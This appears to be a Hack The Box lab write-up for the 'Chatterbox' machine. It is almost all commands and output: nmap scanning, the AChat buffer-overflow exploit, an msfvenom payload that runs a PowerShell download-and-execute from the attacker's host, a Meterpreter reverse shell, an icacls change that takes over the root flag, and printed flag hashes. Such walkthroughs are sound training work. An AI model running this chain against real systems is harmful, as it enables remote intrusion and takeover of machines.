# chatterbox: https://app.hackthebox.com/machines/Chatterbox

```bash
nmap -sC -sV 10.10.10.74                   

Nmap scan report for 10.10.10.74
Host is up (0.083s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-26T00:04:26
|_  start_date: 2023-04-25T22:34:21
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-04-25T20:04:27-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h20m01s, deviation: 2h18m36s, median: 5h00m00s
```
```bash
nmap -sV 10.10.10.74 -p- -vvv  

PORT      STATE SERVICE      REASON  VERSION
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         syn-ack AChat chat system httpd
9256/tcp  open  achat        syn-ack AChat chat system
49152/tcp open  msrpc        syn-ack Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack Microsoft Windows RPC
49156/tcp open  msrpc        syn-ack Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows
```
```bash
searchsploit AChat                       
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                      | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                         | windows/remote/36056.rb
```

```bash
searchsploit -m windows/remote/36025.py
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
    Codes: CVE-2015-1578, CVE-2015-1577, OSVDB-118206, OSVDB-118104
 Verified: False
File Type: Python script, ASCII text executable, with very long lines (637)
Copied to: /home/joker/Desktop/23_HTB/chatterbox/36025.py
```
```bash
cat 36025.py

.
.snipped
.
msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
.
.snipped
.
```
```bash
/usr/share/unicorn-magic/unicorn.py windows/meterpreter/reverse_https 10.10.14.22 8787

	
[*] Exported powershell output code to powershell_attack.txt.
[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.
```
```bash
msfconsole -r unicorn.rc

[*] Processing unicorn.rc for ERB directives.
resource (unicorn.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (unicorn.rc)> set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
resource (unicorn.rc)> set LHOST 10.10.14.22
LHOST => 10.10.14.22
resource (unicorn.rc)> set LPORT 8787
LPORT => 8787
resource (unicorn.rc)> set ExitOnSession false
ExitOnSession => false
resource (unicorn.rc)> set AutoVerifySession false
[-] Unknown datastore option: AutoVerifySession. Did you mean AutoVerifySessionTimeout?
resource (unicorn.rc)> set AutoSystemInfo false
AutoSystemInfo => false
resource (unicorn.rc)> set AutoLoadStdapi false
AutoLoadStdapi => false
resource (unicorn.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://10.10.14.22:8787
```
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -ep bypass -nop -c \"iex(new-object net.webclient).downloadstring('http://10.10.14.22/powershell_attack.txt')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python 
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 736 (iteration=0)
x86/unicode_mixed chosen with final size 736
Payload size: 736 bytes
Final size of python file: 3637 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
.
.snipped
.

#Add the payload to 36025.py
```
```bash
python2 36025.py
---->{P00F}!
```
```bash
python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.74 - - [26/Apr/2023 11:46:14] "GET /powershell_attack.txt HTTP/1.1" 200 -
```
```bash
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://10.10.14.22:8787
[!] https://10.10.14.22:8787 handling request from 10.10.10.74; (UUID: ejfyluj0) Without a database connected that payload UUID tracking will not work!
[*] https://10.10.14.22:8787 handling request from 10.10.10.74; (UUID: ejfyluj0) Staging x86 payload (176732 bytes) ...
[!] https://10.10.14.22:8787 handling request from 10.10.10.74; (UUID: ejfyluj0) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.22:8787 -> 10.10.10.74:49175) at 2023-04-26 11:46:30 -0400

```
```bash
msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x86/windows               10.10.14.22:8787 -> 10.10.10.74:49175 (10.10.10.74)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 

```
```bash
meterpreter > shell
[-] The "shell" command requires the "stdapi" extension to be loaded (run: `load stdapi`)
meterpreter > load stdapi
Loading extension stdapi...Success.
meterpreter > shell
Process 23096 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
```bash
C:\Users\Alfred\Desktop>type user.txt
type user.txt
1b7961f7375cfb82e1f34ef522a31f73
```
```bash
C:\Users\Administrator>icacls Desktop
icacls Desktop
Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```
```bash
C:\Users\Administrator\Desktop>icacls root.txt
icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files

```
```bash
C:\Users\Administrator\Desktop>icacls root.txt /grant alfred:F
icacls root.txt /grant alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
```
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
83bcca098bfac6738a2f4d2d272efafb
```
